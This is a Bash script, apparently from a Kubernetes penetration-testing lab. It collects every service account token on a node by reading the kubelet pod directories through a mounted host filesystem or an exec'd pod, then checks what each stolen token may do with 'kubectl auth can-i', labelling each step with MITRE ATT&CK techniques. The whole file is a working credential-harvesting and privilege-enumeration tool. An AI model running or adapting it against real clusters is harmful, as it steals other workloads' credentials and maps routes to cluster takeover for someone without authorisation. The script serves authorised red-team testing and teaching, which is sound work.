#!/bin/bash
###############################################################################
# Purpose: 
# 
# This script will find the token/secret for each pod running on the node and 
# tell you what each token is authorized to do. It can be run from within a pod 
# that has the host's filesystem mounted to /host, or from outside the pod.
#
# NEW FEATURES in v2:
# - Logs executed commands with MITRE ATT&CK technique annotations
# - Supports --shorten flag to truncate long output
#
# Usage:
#
# *** For execution INSIDE a pod with the host's filesystem mounted to /host *** 
#
#        This mode is best for:
#            - everything-allowed       
#            - hostPath
#
# Copy the can-they.sh helper script to the pod, download it from github, or manually created it
#     kubectl cp scripts/can-they-v2.sh podname:/
#
# Exec into pod (Don't chroot)
#     kubectl exec -it pod-name  -- bash
#
# Run can-they-v2.sh
#    ./can-they-v2.sh -i "--list"
#    ./can-they-v2.sh -i "--list -n kube-system"
#    ./can-they-v2.sh -i "list secrets -n kube-system" --shorten
#    ./can-they-v2.sh -i "create pods -n kube-system"
#    ./can-they-v2.sh -i "create clusterrolebindings"
#
#
# *** For execution OUTSIDE a pod ***
#
#        This mode is best for:
#            - priv-and-hostpid       
#
# Run can-they-v2.sh
#    ./can-they-v2.sh -n NAMESPACE -p POD_NAME -i "OPTIONS"
#    ./can-they-v2.sh -n development -p priv-and-hostpid-exec-pod -i "list secrets -n kube-system"
#    ./can-they-v2.sh -n development -p priv-and-hostpid-exec-pod -i "--list" --shorten
#
###############################################################################

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Default values
SHORTEN=false
MAX_OUTPUT_LINES=20
OUTPUT_FILE=""

# Function to log command with MITRE technique
function log_command() {
  local cmd="$1"
  local technique="$2"
  local description="$3"
  
  if [ -n "$OUTPUT_FILE" ]; then
    echo "[COMMAND] $cmd" >> "$OUTPUT_FILE"
    echo "[MITRE] $technique - $description" >> "$OUTPUT_FILE"
    # Also print to console
    echo -e "${CYAN}[COMMAND]${NC} $cmd"
    echo -e "${MAGENTA}[MITRE]${NC} $technique - $description"
  else
    echo -e "${CYAN}[COMMAND]${NC} $cmd"
    echo -e "${MAGENTA}[MITRE]${NC} $technique - $description"
  fi
}

# Function to execute command and optionally shorten output
function exec_with_logging() {
  local cmd="$1"
  local technique="$2"
  local description="$3"
  
  log_command "$cmd" "$technique" "$description"
  
  if [ -n "$OUTPUT_FILE" ]; then
    eval "$cmd" >> "$OUTPUT_FILE" 2>&1
    echo "" >> "$OUTPUT_FILE"
  else
    if [ "$SHORTEN" = true ]; then
      output=$(eval "$cmd" 2>&1)
      line_count=$(echo "$output" | wc -l)
      
      if [ "$line_count" -gt "$MAX_OUTPUT_LINES" ]; then
        echo "$output" | head -n "$MAX_OUTPUT_LINES"
        echo -e "${YELLOW}... [Output truncated: showing $MAX_OUTPUT_LINES of $line_count lines]${NC}"
      else
        echo "$output"
      fi
    else
      eval "$cmd"
    fi
    echo
  fi
}

function check-can-exec-pod {
check=$(kubectl auth can-i create pods/exec -n $namespace)
#echo $check
if [[ $check == "no" ]]; then
  echo "Are you sure you have access to exec into $pod in the $namespace namespace?"
  exit 1
fi
}

function run-outside-pod {
  echo -e "${GREEN}=== Starting Token Enumeration (Outside Pod Mode) ===${NC}\n"
  
  # Step 1: Find tokens
  if [ -n "$OUTPUT_FILE" ]; then
    echo -e "${YELLOW}[INFO] Searching for tokens...${NC}"
  fi
  
  find_cmd="kubectl exec -it $pod -n $namespace -- find /host/var/lib/kubelet/pods/ -name token -type l 2>/dev/null"
  log_command "$find_cmd" "T1552.001" "Unsecured Credentials: Credentials In Files - Search/Read service account tokens from filesystem"
  
  tokens=$(eval "$find_cmd")
  
  # Backup plan in case you are chrooted or running on host
  if [ $? -eq 1 ]; then
    find_cmd="kubectl exec -it $pod -n $namespace -- find /var/lib/kubelet/pods/ -name token -type l"
    log_command "$find_cmd" "T1552.001" "Unsecured Credentials: Credentials In Files - Fallback token search"
    tokens=$(eval "$find_cmd")
  fi
  
  if [ -n "$OUTPUT_FILE" ]; then
    token_count=$(echo "$tokens" | wc -w)
    echo -e "${GREEN}[SUCCESS] Found $token_count tokens.${NC}\n"
    echo -e "${YELLOW}[INFO] Enumerating permissions for tokens...${NC}"
  fi
  
  # Step 2: Enumerate permissions for each token
  count=0
  for filename in $tokens; do
    filename_clean=$(echo $filename | tr -dc '[[:print:]]')
    
    if [ -n "$OUTPUT_FILE" ]; then
      ((count++))
      echo -e "[INFO] Processing token $count/$token_count: $filename_clean"
      echo "--------------------------------------------------------" >> "$OUTPUT_FILE"
      echo "Token Location: $filename_clean" >> "$OUTPUT_FILE"
    else
      echo "--------------------------------------------------------"
      echo -e "${BLUE}Token Location:${NC} $filename_clean"
    fi
    
    # Read token
    read_cmd="kubectl exec -it $pod -n $namespace -- cat $filename_clean"
    log_command "$read_cmd" "T1552.001" "Unsecured Credentials: Credentials In Files - Extract service account token"
    tokena=$(eval "$read_cmd")
    
    # Test permissions
    if [ -n "$OUTPUT_FILE" ]; then
      echo "Can I $user_input?" >> "$OUTPUT_FILE"
    else
      echo -e "${BLUE}Can I $user_input?${NC}"
    fi
    
    SERVER=$(kubectl config view --minify --flatten -ojsonpath='{.clusters[].cluster.server}')
    export KUBECONFIG="dummy"
    
    auth_cmd="kubectl --server=$SERVER --insecure-skip-tls-verify --token=\$tokena auth can-i $user_input 2>/dev/null"
    log_command "$auth_cmd" "T1613" "Container and Resource Discovery - Enumerate service account permissions"
    
    if [ -n "$OUTPUT_FILE" ]; then
      kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i $user_input >> "$OUTPUT_FILE" 2>&1
      echo "" >> "$OUTPUT_FILE"
    else
      kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i $user_input 2> /dev/null
      echo
    fi
    unset KUBECONFIG
  done
  
  if [ -n "$OUTPUT_FILE" ]; then
    echo -e "\n${GREEN}[DONE] Results saved to $OUTPUT_FILE${NC}"
  fi
}

function am-i-inside-pod-check {
echo $KUBERNETES_SERVICE_HOST
if [[ -z $KUBERNETES_SERVICE_HOST ]]; then
  echo "It does not appear you are in a Kubernetes pod?"
  echo
  usage
fi
}

function run-inside-pod {
  echo -e "${GREEN}=== Starting Token Enumeration (Inside Pod Mode) ===${NC}\n"
  
  if [ -n "$OUTPUT_FILE" ]; then
    echo "=== Starting Token Enumeration at $(date) ===" > "$OUTPUT_FILE"
  fi
  
  # Check if kubectl is installed
  if [ ! -f  "/usr/local/bin/kubectl" ]; then
    echo -e "${YELLOW}[INFO] kubectl not found, installing...${NC}\n"
    
    install_cmd="apt update && apt -y install curl"
    log_command "$install_cmd" "T1105" "Ingress Tool Transfer - Install curl to download tools"
    eval "$install_cmd" > /dev/null 2>&1
    
    #Download and install kubectl into pod
    download_cmd="curl -LO \"https://storage.googleapis.com/kubernetes-release/release/\$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl\""
    log_command "$download_cmd" "T1105" "Ingress Tool Transfer - Download kubectl binary"
    eval "$download_cmd" > /dev/null 2>&1
    
    chmod +x ./kubectl
    mv ./kubectl /usr/local/bin/kubectl
    echo -e "${GREEN}[SUCCESS] kubectl installed${NC}\n"
  fi

  # Step 1: Find tokens
  if [ -n "$OUTPUT_FILE" ]; then
    echo -e "${YELLOW}[INFO] Searching for tokens...${NC}"
  fi
  
  find_cmd="find /host/var/lib/kubelet/pods/ -name token -type l"
  log_command "$find_cmd" "T1552.001" "Unsecured Credentials: Credentials In Files - Search for service account tokens"
  
  tokens=$(eval "$find_cmd" 2>/dev/null)
  
  # Backup plan in case you are chrooted or running on host
  if [ $? -eq 1 ]; then
    find_cmd="find /var/lib/kubelet/pods/ -name token -type l"
    log_command "$find_cmd" "T1552.001" "Unsecured Credentials: Credentials In Files - Fallback token search"
    tokens=$(eval "$find_cmd")
  fi
  
  if [ -n "$OUTPUT_FILE" ]; then
    token_count=$(echo "$tokens" | wc -w)
    echo -e "${GREEN}[SUCCESS] Found $token_count tokens.${NC}\n"
    echo -e "${YELLOW}[INFO] Enumerating permissions for tokens...${NC}"
  fi
  
  # Step 2: For each token, enumerate permissions
  count=0
  for filename in $tokens; do
    filename_clean=$(echo $filename | tr -dc '[[:print:]]')
    
    if [ -n "$OUTPUT_FILE" ]; then
      ((count++))
      echo -e "[INFO] Processing token $count/$token_count: $filename_clean"
      echo "--------------------------------------------------------" >> "$OUTPUT_FILE"
      echo "Token Location: $filename_clean" >> "$OUTPUT_FILE"
    else
      echo "--------------------------------------------------------"
      echo -e "${BLUE}Token Location:${NC} $filename_clean"
    fi
    
    # Read token
    read_cmd="cat $filename_clean"
    log_command "$read_cmd" "T1552.001" "Unsecured Credentials: Credentials In Files - Extract service account token"
    tokena=$(eval "$read_cmd")
    
    # Test permissions
    if [ -n "$OUTPUT_FILE" ]; then
      echo "Can I $user_input?" >> "$OUTPUT_FILE"
    else
      echo -e "${BLUE}Can I $user_input?${NC}"
    fi
    
    auth_cmd="kubectl --token=\$tokena auth can-i $user_input"
    log_command "$auth_cmd" "T1613" "Container and Resource Discovery - Enumerate service account permissions"
    
    if [ -n "$OUTPUT_FILE" ]; then
      kubectl --token=$tokena auth can-i $user_input >> "$OUTPUT_FILE" 2>&1
      echo "" >> "$OUTPUT_FILE"
    else
      kubectl --token=$tokena auth can-i $user_input
      echo
    fi
  done
  
  if [ -n "$OUTPUT_FILE" ]; then
    echo -e "\n${GREEN}[DONE] Results saved to $OUTPUT_FILE${NC}"
  fi
}

function usage {
  echo "Usage: "
  echo
  echo "  [From outside a pod]: $0 -p podname -n namespace [-i \"VERB [TYPE] [options]\"] [--shorten] [--output-file FILE]"
  echo "  [From inside a pod]:  $0 [-i \"VERB [TYPE] [options]\"] [--shorten] [--output-file FILE]"
  echo
  echo "Options: "
  echo
  printf "  -p\t\tPod Name\n"
  printf "  -n\t\tNamespace\n"
  printf "  -i\t\tArguments that you would normally pass to kubectl auth can-i []\n"
  printf "  --shorten\tTruncate long output (shows first $MAX_OUTPUT_LINES lines)\n"
  printf "  --output-file\tSave detailed output to FILE, show progress bar on console\n"
  echo
  exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
  case "$1" in
    -n)
      namespace="$2"
      shift 2
      ;;
    -p)
      pod="$2"
      shift 2
      ;;
    -i)
      user_input="$2"
      shift 2
      ;;
    --shorten)
      SHORTEN=true
      shift
      ;;
    --output-file)
      OUTPUT_FILE="$2"
      shift 2
      ;;
    *)
      usage
      ;;
  esac
done

if [[ -z "$user_input" ]]; then
  user_input="--list"
fi

if [[ "$namespace" ]] && [[ "$pod" ]]; then
  #echo "outside"
  check-can-exec-pod
  run-outside-pod

elif  [[ -z "$namespace" ]] && [[ -z "$pod" ]]; then
  #echo "inside"
  am-i-inside-pod-check
  run-inside-pod
else
  echo "If running this script from outside a pod, you need to specify both the pod name and the namespace"
  usage
fi
